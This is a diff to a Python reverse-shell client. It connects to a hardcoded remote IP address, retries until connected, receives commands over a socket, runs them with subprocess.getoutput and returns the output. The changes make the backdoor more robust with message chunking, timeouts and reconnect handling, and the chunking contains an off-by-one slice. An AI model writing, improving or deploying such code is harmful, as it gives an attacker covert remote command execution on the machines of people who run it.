@@ -3,7 +3,7 @@ import time
 import os
 import subprocess
 
-HEADER = 128
+HEADER = 1024
 PORT = 87
 # SERVER = "127.0.0.1"
 SERVER = "46.101.213.187"
@@ -14,26 +14,35 @@ client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 
 def send(msg):
+    more = False
     msg_encoded = msg.encode(FORMAT)
+    if len(msg_encoded) > 1000:
+        msg_encoded = msg_encoded[:1000]
+        more = True
     msg_len = len(msg_encoded)
     msg_len_encoded = str(msg_len).encode(FORMAT)
     msg_len_encoded += b" " * (HEADER - len(str(msg_len)))
+    print(len(msg_len_encoded))
+    print(msg_len_encoded.decode())
     client.send(msg_len_encoded)
     client.send(msg_encoded)
+    if more: send(msg_encoded[1001:].decode(FORMAT))
 
 
 def receive(conn):
-    msg_len = conn.recv(HEADER).decode(FORMAT)
-    if not msg_len.strip(): return ""  # if message is blank ignore it
-    # puts it into int from string
+    try:
+        msg_len = conn.recv(HEADER).decode(FORMAT)
+    except:
+        raise socket.timeout()
+    if not msg_len: raise socket.timeout()
     msg_len = int(msg_len)
     msg = conn.recv(msg_len).decode(FORMAT)
     return msg
 
 
-def is_still_connected(sock):
+def is_still_connected():
     try:
-        sock.sendall(b"")
+        send("")
     except:
         return False
     return True
@@ -46,29 +55,38 @@ def connect(addr):
         client.connect(ADDR)
         return True
     except:
-        return False
         time.sleep(10)
+        return False
 
 
 def main():
+    global client
     while True:
         while True:
             if connect(ADDR): break
+        client.settimeout(5)
         while True:
             command = ""
             output = ""
             try:
                 command = receive(client).lower()
-            except:
-                break
-            if command == "": continue
-            if command in ["exit", "disconnect"]:
-                break
+            except socket.timeout:
+                if not is_still_connected():
+                    break
+                else:
+                    continue
+            if command == "":
+                continue
+            elif command == "disconnect":
+                continue
             split_command = command.split()
             if command.lower() == "exit":
                 # if the command is exit, just break out of the loop
                 break
-            if split_command[0].lower() == "cd":
+            elif command.lower().strip() == "cd":
+                send(os.getcwd())
+                continue
+            elif split_command[0].lower() == "cd":
                 # cd command, change directory
                 try:
                     os.chdir(' '.join(split_command[1:]))
@@ -78,10 +96,9 @@ def main():
                 else:
                     # if operation is successful, empty message
                     output = ""
-            else:
-                if command == "exit":
-                    send(DISCONNECT_MESSAGE)
-                    exit()
+            elif command == "exit":
+                send(DISCONNECT_MESSAGE)
+                exit()
             # execute the command and retrieve the results
             output = subprocess.getoutput(command)
             # get the current working directory as output
